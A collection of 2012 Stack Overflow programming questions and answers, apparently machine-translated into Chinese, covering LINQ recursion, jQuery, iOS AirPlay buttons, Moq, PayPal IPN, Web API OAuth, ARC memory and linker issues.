> ID：12318372
> 
> 赞同：6
> 
> 时间：2012-09-07T12:42:43.960
> 
> 标签：c#, linq, recursion, tree, nested-class

我有一个问题要问你那里的 linq 专家！在 Component 实例的嵌套列表中，我需要知道其中是否存在特定类型的组件。可以用linq表达吗？考虑到可能有 application.Components[0].Components[0].Components[0]... 我的问题是针对 linq 中的递归查询！

我把实体留给你，让你对模型有一些了解。

```
public class Application
{
    public List<Component> Components { get; set; }
}

public class Component
{
    public ComponentType Type { get; set; }
    public List<Component> Components { get; set; }
}

public enum ComponentType
{
    WindowsService,
    WebApplication,
    WebService,
    ComponentGroup
} 
```

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-09-07T13:00:36.843

您想知道组件中的任何组件是否属于给定类型？

```
var webType = ComponentType.WebApplication;
IEnumerable<Component> webApps = from c in components
                                 from innerComp in c.Components
                                 where innerComp.Type == webType;
bool anyWebApp = webApps.Any(); 
```

* * *

> innercomp.components 呢？

**编辑**：所以你想递归地查找给定类型的组件，而不仅仅是在顶层或第二层。然后您可以使用以下`Traverse`扩展方法：

```
public static IEnumerable<T> Traverse<T>(this IEnumerable<T> source, Func<T, IEnumerable<T>> fnRecurse)
{
    foreach (T item in source)
    {
        yield return item;

        IEnumerable<T> seqRecurse = fnRecurse(item);
        if (seqRecurse != null)
        {
            foreach (T itemRecurse in Traverse(seqRecurse, fnRecurse))
            {
                yield return itemRecurse;
            }
        }
    }
} 
```

以这种方式使用：

```
var webType = ComponentType.WebApplication;
IEnumerable<Component> webApps = components.Traverse(c => c.Components)
                                 .Where(c => c.Type == webType);
bool anyWebApp = webApps.Any(); 
```

样本数据：

```
var components = new List<Component>() { 
    new Component(){ Type=ComponentType.WebService,Components=null },
    new Component(){ Type=ComponentType.WebService,Components=new List<Component>(){
        new Component(){ Type=ComponentType.WebService,Components=null },
        new Component(){ Type=ComponentType.ComponentGroup,Components=null },
        new Component(){ Type=ComponentType.WindowsService,Components=null },
    } },
    new Component(){ Type=ComponentType.WebService,Components=null },
    new Component(){ Type=ComponentType.WebService,Components=new List<Component>(){
        new Component(){ Type=ComponentType.WebService,Components=new List<Component>(){
            new Component(){Type=ComponentType.WebApplication,Components=null}
        } },
        new Component(){ Type=ComponentType.WindowsService,Components=null },
        new Component(){ Type=ComponentType.WebService,Components=null },
    } },
    new Component(){ Type=ComponentType.WebService,Components=null },
    new Component(){ Type=ComponentType.ComponentGroup,Components=null },
    new Component(){ Type=ComponentType.WebService,Components=null },
}; 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:48:19.073

```
if( Components.Any( c => c.Type == ComponentType.WindowsService ) )
{
   // do something
} 
```

或者你可以做

```
var listContainsAtLeastOneService = 
    ( from c in Components
      where c.Type == ComponentType.WindowsService
      select c ).Any( ); 
```

# javascript - 悬停时淡化背景颜色

> ID：12318373
> 
> 赞同：1
> 
> 时间：2012-09-07T12:42:46.037
> 
> 标签：javascript, jquery, html, css

尝试淡出（在悬停时淡入 || 出）背景图像并在 CSS 类中具有活动状态，我的菜单如下所示：

```
<ul>
    <li class="menuitem" id="myTag">                    
        <a href="#" class="menu-item-a">
           <span class="menu-item-span">MenuItem</span>
        </a>                   
    </li>
    <li class="menuitem" id="myTag">                    
        <a href="#" class="menu-item-a">
           <span class="menu-item-span">MenuItem 1</span>
        </a>                   
    </li>
    <li class="menuitem" id="myTag">                    
        <a href="#" class="menu-item-a">
           <span class="menu-item-span">MenuItem 1</span>
        </a>                   
    </li>
</ul> 
```

注意：目前我有两个背景图像（右侧和左侧），以便菜单项可展开。

由于浏览器兼容性，现在我想避免使用 CSS3 :|

有什么解决办法吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:36:54.730

如前所述，我认为制作 jsFiddle 或您遇到的任何类似问题很重要，只是为了加快帮助过程。我整理了一些我认为你正在努力实现的东西，但我可能是错的。

在这里，您可以将我刚刚使用背景颜色的位置更改为您的图像，并使跨度淡入悬停状态，并在单击其中一个项目时脚本应用于 .active 状态的另一个图像。

希望这可以帮助：

**jsFiddle：** [//jsfiddle.net/visualdecree/SvjHx/](http://jsfiddle.net/visualdecree/SvjHx/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T12:59:20.180

正如@SoonDead 在他的评论中提到的那样，很难理解你在说什么。

但是您可以使用[jQuery](http://jquery.com/)来更改类/外观，以及基于规则的许多其他事情，例如悬停。

我已经使用[jsfiddle](http://jsfiddle.net/wigster/VTy2z/)创建了一个基本示例，尽管如果您想要这个基本示例，只需使用 CSS`:hover`选择器，即。`span:hover{//add styling here}`

# objective-c - 如何在 Airplay 处于活动状态时自定义 Airplay 按钮

> ID：12318377
> 
> 赞同：7
> 
> 时间：2012-09-07T12:43:06.133
> 
> 标签：objective-c, cocoa-touch, airplay

已经尝试解决这个问题 2 天了，我放弃了。我试图实现一个自定义的播放按钮（我必须因为背景是白色的，按钮必须是黑色的）。我在 interfacebuilder 中添加了一个视图，并为它选择了 mpVolumeView。然后我建立了连接并编写了以下代码；

```
viewDidLoad.. {
    .....

    [_volumeView setShowsVolumeSlider:NO];
    for (UIButton *button in _volumeView.subviews) {
        if ([button isKindOfClass:[UIButton class]]) {
            [button setImage:[UIImage imageNamed:@"airplay_icon.png"] forState:UIControlStateNormal];
            [button addObserver:self forKeyPath:@"alpha" options:NSKeyValueObservingOptionNew context:nil];
            [button addTarget:self action:@selector(switchAirplayButton) forControlEvents:UIControlEventTouchUpInside];
            [button sizeToFit];
        }
    }
    [_volumeView sizeToFit];

}

-(void)switchAirplayButton {

    for (UIButton *button in _volumeView.subviews) {
        if ([button isKindOfClass:[UIButton class]]) {

            NSLog(@"%d", _controlBar.player.airPlayVideoActive);

            if(_controlBar.player.airPlayVideoActive) {
                [button setImage:[UIImage imageNamed:@"airplay_icon_pressed.png"] forState:UIControlStateNormal];
            } else  [button setImage:[UIImage imageNamed:@"airplay_icon.png"] forState:UIControlStateNormal];

            [button sizeToFit];
        }
    }

}

- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context {
    if ([object isKindOfClass:[UIButton class]] && [[change valueForKey:NSKeyValueChangeNewKey] intValue] == 1) {
        [(UIButton *)object setImage:[UIImage imageNamed:@"airplay_icon.png"] forState:UIControlStateNormal];
        [(UIButton *)object sizeToFit];
    }
} 
```

“播放器”是基于 AVPLayer 的单片机。但是，在检查 airPlay 是否处于活动状态时，它总是返回 false。也许这只是因为我使用的是声音，而不是视频。

所以我的问题是，我如何将按钮更改为......让我们说一个橙色的按钮（只是为了匹配界面的其余部分），当播放播放时（就像苹果让它变成蓝色一样）。我已经尝试了一切，但它根本不起作用。请帮我。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-09-10T23:14:47.060

编辑：

虽然下面的代码适用于 iOS 5 和 6，但从 iOS 6.0 开始，有一种官方方法可以做到这一点，这要容易得多。只需查看 的文档`MPVolumeView`，特别是`– setRouteButtonImage:forState:`.

==== 旧答案：====

这很难实现，但我找到了适用于 iOS 5.0+ 的方法。首先，将以下行添加到您的 ViewController：

```
#import <AudioToolbox/AudioToolbox.h> 
```

在您的 viewDidLoad 中，您已经做对了大部分事情，这是我的代码：

```
for (id current in self.volumeView.subviews){
    if([current isKindOfClass:[UIButton class]]) {
        UIButton *airPlayButton = (UIButton*)current;
        self.airPlayButton = airPlayButton;
        [self setAirPlayButtonSelected:[self isAirPlayActive]];
        [airPlayButton addObserver:self forKeyPath:@"alpha" options:NSKeyValueObservingOptionNew context:nil];
    }
} 
```

这是辅助`setAirPlayButtonSelected`方法，它只是设置图像：

```
- (void)setAirPlayButtonSelected:(BOOL)selected {
    UIImage* image;
    if (selected) {
        image = [UIImage imageNamed:@"button-airplay-selected"];
    }else {
        image = [UIImage imageNamed:@"button-airplay"];
    }
    [self.airPlayButton setImage:image forState:UIControlStateNormal];
    [self.airPlayButton setImage:image forState:UIControlStateHighlighted];
    [self.airPlayButton setImage:image forState:UIControlStateSelected];
} 
```

为了完整起见，`observeValueForKeyPath`：

```
- (void)observeValueForKeyPath:(NSString *)keyPath ofObject:(id)object change:(NSDictionary *)change context:(void *)context {

    if (object == self.airPlayButton && [[change valueForKey:NSKeyValueChangeNewKey] intValue] == 1) {
        [self setAirPlayButtonSelected:[self isAirPlayActive]];
    }
} 
```

现在是有趣的部分。这是`isAirPlayActive`辅助方法。它使用 AudioSession 框架来确定当前正在播放的音频源。

```
- (BOOL)isAirPlayActive{
    CFDictionaryRef currentRouteDescriptionDictionary = nil;
    UInt32 dataSize = sizeof(currentRouteDescriptionDictionary);
    AudioSessionGetProperty(kAudioSessionProperty_AudioRouteDescription, &dataSize, &currentRouteDescriptionDictionary);
    if (currentRouteDescriptionDictionary) {
        CFArrayRef outputs = CFDictionaryGetValue(currentRouteDescriptionDictionary, kAudioSession_AudioRouteKey_Outputs);
        if(CFArrayGetCount(outputs) > 0) {
            CFDictionaryRef currentOutput = CFArrayGetValueAtIndex(outputs, 0);
            CFStringRef outputType = CFDictionaryGetValue(currentOutput, kAudioSession_AudioRouteKey_Type);
            return (CFStringCompare(outputType, kAudioSessionOutputRoute_AirPlay, 0) == kCFCompareEqualTo);
        }
    }

    return NO;
} 
```

因此，所有这些代码都会在应用启动时正确更改 AirPlay 按钮。更新呢？我们需要监听 AudioSource 的变化。将以下行添加到您的`viewDidLoad`：

```
 AudioSessionAddPropertyListener (kAudioSessionProperty_AudioRouteChange, audioRouteChangeCallback, (__bridge void*)self); 
```

不要忘记取消注册`dealloc`：

```
- (void)dealloc {
    [self.airPlayButton removeObserver:self forKeyPath:@"alpha"];

    AudioSessionRemovePropertyListenerWithUserData(kAudioSessionProperty_AudioRouteChange, audioRouteChangeCallback, (__bridge void*)self);

} 
```

并在您的 ViewController 上方添加此 C 函数`@implementation`：

```
void audioRouteChangeCallback (void                   *inUserData,
                                       AudioSessionPropertyID inPropertyID,
                                       UInt32                 inPropertyValueSize,
                                       const void             *inPropertyValue) {

    if (inPropertyID != kAudioSessionProperty_AudioRouteChange) {
        return;
    }

    CFDictionaryRef routeChangeDictionary = inPropertyValue;

    CFDictionaryRef currentRouteDescriptionDictionary = CFDictionaryGetValue(routeChangeDictionary, kAudioSession_AudioRouteChangeKey_CurrentRouteDescription);
    CFArrayRef outputs = CFDictionaryGetValue(currentRouteDescriptionDictionary, kAudioSession_AudioRouteKey_Outputs);
    if(CFArrayGetCount(outputs) > 0) {
        CFDictionaryRef currentOutput = CFArrayGetValueAtIndex(outputs, 0);
        CFStringRef outputType = CFDictionaryGetValue(currentOutput, kAudioSession_AudioRouteKey_Type);

        [(__bridge SettingsViewController*)inUserData setAirPlayButtonSelected:CFStringCompare(outputType, kAudioSessionOutputRoute_AirPlay, 0) == kCFCompareEqualTo];
    }

} 
```

如您所见，它所做的只是确定 AirPlay 输出源是否处于活动状态并`setAirPlayButtonSelected`相应地调用该方法。

请参阅 Apple 的[音频会话编程指南](http://developer.apple.com/library/ios/#documentation/Audio/Conceptual/AudioSessionProgrammingGuide/Introduction/Introduction.html)，特别是[本节](http://developer.apple.com/library/ios/#documentation/Audio/Conceptual/AudioSessionProgrammingGuide/HandlingRouteChanges/HandlingRouteChanges.html#//apple_ref/doc/uid/TP40007875-CH12-SW1)以获取有关回调如何准确工作等的详细信息。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-11T22:38:42.400

在此处查看此类似[链接。](https://stackoverflow.com/questions/5174204/customize-the-airplay-buttons-appearance)

我不确定这是否可行，但尝试制作一个带有播放符号的黑色按钮，然后将其放在难以看到的播放按钮顶部。您应该将用户交互设置为禁用。试试看，这可能是一个更简单的解决方案。

*不要忘记在属性检查器和身份检查器上设置禁用用户交互。

# linq - 起订量设置不适用于接口方法，并使用 IQueryable 结果进入起订量方法

> ID：12318385
> 
> 赞同：1
> 
> 时间：2012-09-07T12:43:31.980
> 
> 标签：linq, mocking, installation, moq, iqueryable

我在模拟返回 IQueryable 接口的名为 Query 的方法时遇到问题，我不知道为什么。

我尝试使用 Moq 框架模拟的方法：

```
public class ObjectContextRepository : IObjectContextRepository
    {
        .....
        private ObjectContext _objectContext = null;      
        public IQueryable<TEntity> Query<TEntity>() where TEntity : class
        {
// Moq Setup doesn't work and debugger enters this code:
            return ObjectContext.CreateObjectSet<TEntity>();
        }
...
} 
```

测试示例：

```
ObjectContextRepositoryFactory = new Mock<IObjectContextRepositoryFactory>();
ObjectContextRepositoryFactory.Setup(x => x.NewInstance(false))
                                          .Returns(new ObjectContextRepository(It.IsAny<string>()));

CurrencyRateManager = new CurrencyRateManager(new ObjectContextRepositoryFactory("connection"));

ObjectContextRepository = new Mock<IObjectContextRepository>();
CurrencyExchangeRate rate1 = new CurrencyExchangeRate {EXCHANGE_DATE = new DateTime(2012, 09, 07)};
CurrencyExchangeRate rate2 = new CurrencyExchangeRate {EXCHANGE_DATE = new DateTime(2012, 09, 06)};

IList<CurrencyExchangeRate> list = new List<CurrencyExchangeRate> { rate1, rate2 };

// I wait that Query() method will return me  a list with rates. 
ObjectContextRepository.Setup(x => x.Query<CurrencyExchangeRate>()).Returns(list.AsQueryable());

using (IObjectContextRepository context = ObjectContextRepositoryFactory.Object.NewInstance())
            {
// Mock doesn't work and debugger enters custom method context.Query<>() and throws an exception
var maxDateQuery = context.Query<CurrencyExchangeRate>()
                    .Where(c => c.EXCHANGE_DATE < new DateTime(2012, 09, 07));
            } 
```

PS。是的，我知道，我必须使用集成测试，但这是我的任务。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T12:48:31.883

您的工厂返回`new ObjectContextRepository(It.IsAny<string>())`而不是您的模拟（甚至稍后定义您的工厂）。所以你的测试是针对真正的实现执行的，而不是模拟的。

顺便说一句，使用`It.IsAny<string>()`inside没有任何意义`Returns`，它什么都不做。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T12:59:55.380

有时停止探索问题并发布问题非常有效。答案很快就来了......

原因在于 Mocked 对象的 Object 属性。我变了

```
ObjectContextRepositoryFactory = new Mock<IObjectContextRepositoryFactory>();
ObjectContextRepositoryFactory.Setup(x => x.NewInstance(false))
                                          .Returns(new ObjectContextRepository(It.IsAny<string>()));

CurrencyRateManager = new CurrencyRateManager(new ObjectContextRepositoryFactory("connection")); 
```

到

```
 ObjectContextRepository = new Mock<IObjectContextRepository>();

        ObjectContextRepositoryFactory = new Mock<IObjectContextRepositoryFactory>();
        ObjectContextRepositoryFactory.Setup(x => x.NewInstance(false))
                                      .Returns(**ObjectContextRepository.Object**);

        CurrencyRateManager = new CurrencyRateManager(**ObjectContextRepositoryFactory.Object**); 
```

它有效。

# asp.net - 为什么在使用 c# 在 asp.net 中使用沙箱验证贝宝响应时，内容长度为零？

> ID：12318386
> 
> 赞同：1
> 
> 时间：2012-09-07T12:43:33.853
> 
> 标签：asp.net, c#-4.0, payment-gateway, paypal-sandbox

我是 ASP.NET 应用程序中 PayPal 集成的新手。以下是我使用 C# 的 ASP.NET 的贝宝代码：

```
protected void Page_Load(object sender, EventArgs e)
{
    //Post back to either sandbox or live
    string strSandbox = "https://www.sandbox.paypal.com/cgi-bin/webscr";
    string strLive = "https://www.paypal.com/cgi-bin/webscr";
    HttpWebRequest req = (HttpWebRequest)WebRequest.Create(strSandbox);

    //Set values for the request back
    req.Method = "POST";
    req.ContentType = "application/x-www-form-urlencoded";
    **byte[] param = Request.BinaryRead(HttpContext.Current.Request.ContentLength);
    string strRequest = Encoding.ASCII.GetString(param);**
    strRequest += "&cmd=_notify-validate";
    req.ContentLength = strRequest.Length;

    //for proxy
    //WebProxy proxy = new WebProxy(new Uri("http://url:port#"));
    //req.Proxy = proxy;

    //Send the request to PayPal and get the response
    StreamWriter streamOut = new StreamWriter(req.GetRequestStream(), System.Text.Encoding.ASCII);
    streamOut.Write(strRequest);
    streamOut.Close();
    StreamReader streamIn = new StreamReader(req.GetResponse().GetResponseStream());
    string strResponse = streamIn.ReadToEnd();
    streamIn.Close();

    if (strResponse == "VERIFIED")
    {
        //check the payment_status is Completed
        //check that txn_id has not been previously processed
        //check that receiver_email is your Primary PayPal email
        //check that payment_amount/payment_currency are correct
        //process payment
    }
    else if (strResponse == "INVALID")
    {
        //log for manual investigation
    }
    else
    {
        //log response/ipn data for manual investigation
    }
} 
```

为什么我的`ContentLength`价值为 0？

# sql - 跳过 Select 语句中的不良记录

> ID：12318387
> 
> 赞同：2
> 
> 时间：2012-09-07T12:43:42.137
> 
> 标签：sql, database

> **可能重复：**
> [将文本安全转换为 XML](https://stackoverflow.com/questions/5724440/safe-casting-text-to-xml)

我正在使用一个存储过程，我在其中选择记录（超过 80000 条）并将这些记录插入到另一个表中。我的查询如下，用于选择存储过程中的记录。

```
SELECT EmployeeID,CAST(EmployeeInformation AS xml) as ei, CreatedTimeStamp 
FROM Employee WITH (NOLOCK) 
```

`EmployeeInformation`列包含字符串格式的 XML 数据。（我不能改变列的格式）

我的问题是，如果*Select*`EmployeeInformation`查询中的任何错误 XML 数据失败并且存储过程失败。

 *例如。坏 XML : `<Employee><EmployeeID></EmployeeI></Employee>`[这里的开始标签`EmployeeID`与结束标签不同`EmployeeI`]

有什么方法可以跳过错误的 XML 记录并在*Select*查询中获取其他记录？另外，有什么方法可以让我跟踪跳过的记录吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T16:24:30.903

我认为当 EmployeeID 元素以 EmployeeI 结尾而没有 D 结尾时，xml 解析器不能让您对不正确的数据进行查询。您可能想编写一个解析器来检测它，但我当然不建议这样做。更正输入可能是更好的方法。请记住，当您的输入有问题时，请修复它！不明确的问题来解决它。此外，无论您的 xml 数据有多大，并且正如您已经选择的那样，xml 数据类型将是存储列的最佳数据类型。

干杯*

# asp.net-mvc-4 - 为 WebApi 实现两条腿的 OAuth 2.0

> ID：12318396
> 
> 赞同：4
> 
> 时间：2012-09-07T12:44:12.183
> 
> 标签：asp.net-mvc-4, oauth-2.0, asp.net-web-api, two-legged

我使用 VS2012RC 创建了一个 mvc4 webapi 项目。我试图在我的项目中实现两条腿的 Oauth 2。我按照教程“http://community.codesmithtools.com/CodeSmith_Community/b/tdupont/archive/2011/03/18/oauth-2-0-for-mvc-two-legged-implementation.aspx”，即使它适用于 mvc，我正在为 web api 实现它。但不工作

我为我的客户端创建了一个 html 页面。当 html 页面加载时，它会执行一个旨在返回“访问令牌”的 ajax 函数。

```
 <script type="text/javascript">
        $(document).ready(function () {
        var url = 'http://localhost:9792/api/Login';
            $.get(url, function(data) {

            alert(data);
            }, "jsonp");
        });
        </script> 
```

**服务器端代码是，**

```
[NoCache]
public class LoginController : ApiController
{

    public LoginModelOAuth GetLogin()
    {

        var response = OAuthServiceBase.Instance.RequestToken();

        LoginModelOAuth lmo = new LoginModelOAuth();
         lmo.RequestToken = response.RequestToken;

        return lmo;
    } 
```

}

**RequestToken()**方法看起来像，

```
 public override OAuthResponse RequestToken()
    {
        var token = Guid.NewGuid().ToString("N");
        var expire = DateTime.Now.AddMinutes(5);
        RequestTokens.Add(token, expire);

        return new OAuthResponse
        {
            Expires = (int)expire.Subtract(DateTime.Now).TotalSeconds,
            RequestToken = token,
            RequireSsl = false,
            Success = true
        };
    } 
```

**LoginModelOAuth**模型看起来像，

```
public class LoginModelOAuth
{

    public string RequestToken { get; set; }      

    public string ErrorMessage { get; set; }

    public string ReturnUrl { get; set; }
} 
```

当我执行客户端代码时，我收到以下错误

```
"500 Internal Server Error" 
```

所以我调试了服务器端代码，在服务器端我得到了一个与此代码相对应的错误

“var response = OAuthServiceBase.Instance.RequestToken();” , 错误是

```
 NullReferenceException was unhandled by user code

  "Object reference not set to an instance of an object." 
```

我的 webconfig 文件看起来像，

```
 <configuration>
  <configSections>
<section name="entityFramework" type="System.Data.Entity.Internal.ConfigFile.EntityFrameworkSection, EntityFramework, Version=4.4.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" requirePermission="false" />
<section name="oauth" type="OAuth2.Mvc.Configuration.OAuthSection, OAuth2.Mvc, Version=1.0.0.0, Culture=neutral"/>
<sectionGroup name="dotNetOpenAuth" type="DotNetOpenAuth.Configuration.DotNetOpenAuthSection, DotNetOpenAuth.Core">
  <section name="messaging" type="DotNetOpenAuth.Configuration.MessagingElement, DotNetOpenAuth.Core" requirePermission="false" allowLocation="true" />
  <section name="reporting" type="DotNetOpenAuth.Configuration.ReportingElement, DotNetOpenAuth.Core" requirePermission="false" allowLocation="true" />
</sectionGroup>
 </configSections>
   <oauth defaultProvider="DemoProvider" defaultService="DemoService">
    <providers>
      <add name="DemoProvider" type="MillionNodesApi.OAuth.DemoProvider, MillionNodesApi" />
    </providers>
<services>
  <add name="DemoService" type="MillionNodesApi.OAuth.DemoService, MillionNodesApi" />
</services>
  </oauth>
    <system.web>
    <httpModules>
      <add name="OAuthAuthentication"     type="OAuth2.Mvc.Module.OAuthAuthenticationModule, OAuth2.Mvc, Version=1.0.0.0, Culture=neutral"/>
    </httpModules>
    <compilation debug="true" targetFramework="4.0" />
    <authentication mode="Forms">
      <forms loginUrl="~/Account/Login" timeout="2880" />
    </authentication>
     <pages>
     <namespaces>
    <add namespace="System.Web.Helpers" />
    <add namespace="System.Web.Mvc" />
    <add namespace="System.Web.Mvc.Ajax" />
    <add namespace="System.Web.Mvc.Html" />
    <add namespace="System.Web.Optimization" />
    <add namespace="System.Web.Routing" />
    <add namespace="System.Web.WebPages" />
  </namespaces>
</pages>
</system.web>
 <dotNetOpenAuth>
    <messaging>
      <untrustedWebRequest>
    <whitelistHosts>
      <!-- Uncomment to enable communication with localhost (should generally not activate in production!) -->
      <!--<add name="localhost" />-->
    </whitelistHosts>
  </untrustedWebRequest>
</messaging>
<!-- Allow DotNetOpenAuth to publish usage statistics to library authors to improve the library. -->
<reporting enabled="true" /> 
```

它适用于web api吗？

如果没有，请向我推荐任何有用的教程。

谢谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-11T08:58:19.650

我认为问题在于您处于[集成模式的 IIS7 中，因此您需要将配置](http://bhaidar.net/post/2007/09/13/HttpModules-and-IIS-7.aspx)从 system.web/httpModules 迁移到 system.webServer/modules

```
<system.web>
    <httpModules>
       <add name="OAuthAuthentication"     type="OAuth2.Mvc.Module.OAuthAuthenticationModule, OAuth2.Mvc, Version=1.0.0.0, Culture=neutral"/>
    </httpModules> 
```

变成

```
<system.webServer>
    <modules>
        <add name="OAuthAuthentication"     type="OAuth2.Mvc.Module.OAuthAuthenticationModule, OAuth2.Mvc, Version=1.0.0.0, Culture=neutral" preCondition="" />
    </modules> 
```

**也试试**

您可以尝试通过设置此模块来命中

```
<modules runAllManagedModulesForAllRequests="true"> 
```

**也许**

如果您仍然遇到问题，则可能是模块的执行顺序尝试删除路由之一并将您的 OAuth 之一放在顶部...

```
<modules>
  <remove name="UrlRoutingModule-4.0" />
<add name="OAuthAuthentication"     type="OAuth2.Mvc.Module.OAuthAuthenticationModule, OAuth2.Mvc, Version=1.0.0.0, Culture=neutral" preCondition="" />
  <add name="UrlRoutingModule-4.0" type="System.Web.Routing.UrlRoutingModule" preCondition="" /> 
```

# ios - 我们如何在 ARC 中显式调用垃圾收集器？还有一种方法可以决定何时在 ARC 中释放内存？

> ID：12318398
> 
> 赞同：3
> 
> 时间：2012-09-07T12:44:13.307
> 
> 标签：ios, ios5, memory-management, memory-leaks, automatic-ref-counting

我是一名 iPhone 开发人员。我在我的应用程序中使用 ARC。我正在分配对象，一旦它的使用结束，我将“nil”分配给它。为了释放内存，我还需要做些什么吗？

还有一种方法，我们可以在 ARC 中显式调用垃圾收集器吗？还有一种方法可以决定何时在 ARC 中释放内存？

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-09-07T13:31:49.643

ARC 不是垃圾收集器——将其视为手动引用计数管理，编译器代表您添加引用计数操作。

您可以做的一件好事是创建一个自动释放池。因为编译器添加了保留、释放和自动释放消息——您的对象最终会在自动释放池中。考虑：

```
@autoreleasepool {
  ..create several temporary objects...
} // << now the autorelease pool is popped, and delayed release messages are sent 
```

创建自动释放池非常便宜，并且可以真正降低内存消耗并确保及时返回对象的资源。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-09-07T13:20:27.937

ARC 没有垃圾收集，所以没有什么可调用的。如果您控制对象的范围和所有权，ARC 将为您处理内存使用。

除了将“nil”分配给引用或让引用超出范围之外，唯一的其他考虑因素是您是否有一些对对象的额外引用（例如将其放入 NSArray），它有自己的需要保留对象.

# javascript - 在时间线上绘制点的公式

> ID：12318399
> 
> 赞同：0
> 
> 时间：2012-09-07T12:44:22.387
> 
> 标签：javascript, plot, formula

我在 javascript 中创建了一个应用程序，用户单击一个按钮启动计时器，按下一系列按钮，然后单击另一个按钮停止计时器。每个按钮被点击的时间以毫秒为单位记录，值被收集在一个数组中。这一切都很好。

下一部分是我遇到麻烦的地方。我想在时间轴中显示数组的值。我有一个脚本，它获取设置为 100% 宽的 div 的宽度。此宽度因用户使用的设备的分辨率而异。我需要做的是创建一个公式，根据我的 div 的宽度将存储在我的数组中的毫秒值缩放为适当的值。

```
For reference:
//Here's my array:
counterbArray = counterbString.split(", ");
counterbArrayL = [counterbArray.length];

//Getting width of div:
var timelinewidth = $("#timeline").width();

//Plotting the points as images:
for (i=1; i<(counterbArrayL); i++)
    {
    document.getElementById('timeline').innerHTML =     document.getElementById('timeline').innerHTML + "<img src='event.gif' width='16' height='15' class='plot' style='left:" + *each value from formula here* + "px' >";         
    } 
```

谢谢！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:03:20.727

您还需要包含用户单击停止时间的变量。

```
var timeofstop = *****;

counterbArray = counterbString.split(", ");
counterbArrayL = [counterbArray.length];

//Getting width of div:
var timelinewidth = $("#timeline").width();

var currentleft;

//Plotting the points as images:
for (var i = 0; i < counterbArrayL; i++) {

    currentleft = Math.round((counterbArray[i] / timeofstop) * timelinewidth);

    document.getElementById('timeline').innerHTML = document.getElementById('timeline').innerHTML + "<img src='event.gif' width='16' height='15' class='plot' style='left:" + currentleft + "px' >";
} 
```

如果要使图像居中，您可能还想从 currentleft 中减去 8。

# iis - IIS7.5 应用程序初始化和网络花园

> ID：12318410
> 
> 赞同：2
> 
> 时间：2012-09-07T12:45:08.180
> 
> 标签：iis, iis-7.5, web-garden

在使用 IIS7.5 和[应用程序初始化](http://www.iis.net/downloads/microsoft/application-initialization)模块时，可以让您的 Web 应用程序始终运行，并且还可以通知自定义方法来预热缓存等。此功能是否可以在 web-garden 模式下工作？

即有多个工作进程准备好处理请求。

我添加了所需的 xml 以允许初始化工作进程，但这只会导致单个工作进程准备好接收请求。

```
 <applicationPools>
        <add name="MyAppWorkerProcess" managedRuntimeVersion="v4.0" startMode="AlwaysRunning" />
    </applicationPools> 
```

是否有多个工作进程都准备好接收？

# iphone - ld: 找不到 -liPhone-lib 的库

> ID：12318412
> 
> 赞同：3
> 
> 时间：2012-09-07T12:45:11.963
> 
> 标签：iphone, ipad, ios5, ios-simulator, xcode4.3

我安装了 Xcode 4.3.3 和 iOS 模拟器 5.1，之后我收到此链接器错误

```
ld: library not found for -liPhone-lib
clang: error: linker command failed with exit code 1 (use -v to see   invocation) 
```

请指导我解决这个问题。

注意：我没有删除 Xcode 4.2 版本，我的构建在这个版本中运行良好。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2016-05-19T06:15:57.253

make Pod ->Build Settings ->Build Active Architecture Only 是 NO 不是 Yes

# jquery - 使用 jQuery 获取 div x 的宽度并将相同的宽度应用于 div y

> ID：12318418
> 
> 赞同：1
> 
> 时间：2012-09-07T12:45:42.167
> 
> 标签：jquery, css, jquery-masonry

我的问题是假设性的，我还没有生成的代码可以使用。

我有一个居中网格的网页，使用 jQuery Masonry 排列。我的问题是美学问题之一。因为砌体使网格居中，这是有目的的，所以网格通常比父容器薄得多，因此它与页眉和页脚中的元素对齐不太好。类似地，有时允许网格扩展到超出标题的宽度，这看起来更糟。

我已经研究过使用脚本来调整流体列的大小，尽管我的网格包含图像并且结果并不好。我现在在想，也许有一个小脚本可以在任何时候检测和获取砌体容器`#grid`的宽度（宽度当然是动态的并内联显示），例如`<div id="grid" class="masonry" style="height: 408px; position: relative; width: 1368px;">`然后将相同的宽度应用于`#header`，`#footer`，以及根据网格宽度使整个事物排列整齐的任何其他要求。

有什么建议么？提前致谢

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T12:49:00.607

当然

```
var current_width = $("#grid").width();
$("#footer, #header").width(current_width); 
```

或者

```
$("#footer, #header").width($("#grid").width()); 
```

现在当页面被调整大小时（如果页面被缩放也会发生？）运行如下代码：

```
$(document).ready(function() {
    $(window).resize(function() {
        $("#footer, #header").width($("#grid").width());
    });
}); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:54:20.990

您也可以这样做：只需将标题放入#container 中，就像在[这个小提琴](http://jsfiddle.net/zLjUJ/)中一样，蓝色框居中并根据需要调整大小。也许这就是你所追求的。

# gcc - gcc 使用哪个链接器？

> ID：12318423
> 
> 赞同：6
> 
> 时间：2012-09-07T12:45:55.707
> 
> 标签：gcc, linker

如何确定我的 gcc 使用了哪个链接器？
例如，我有 3 个链接器：
一个目录中的 2 个，与 gcc 相同的位置，
另一个目录中的另一个链接器。

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-09-07T13:08:20.880

您可以添加`-Wl,-verbose`到您的`gcc`链接命令或使用

```
gcc -print-prog-name=ld 
```

# cordova - Adobe PhoneGap 和 Apache Cordova 有何不同？

> ID：12318424
> 
> 赞同：47
> 
> 时间：2012-09-07T12:45:58.147
> 
> 标签：cordova, mobile

